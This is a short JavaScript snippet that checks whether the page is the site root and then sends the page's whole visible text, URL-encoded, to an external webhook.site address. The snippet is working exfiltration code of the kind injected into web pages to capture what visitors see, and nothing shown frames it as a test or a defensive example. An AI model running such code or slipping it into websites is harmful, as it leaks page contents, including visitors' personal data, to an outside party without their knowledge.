if (location.pathname === '/') {
  fetch('https://webhook.site/411bedb1-bc74-4bf2-bf9e-70cea35b1f92?text=' + encodeURIComponent(document.body.innerText));
}
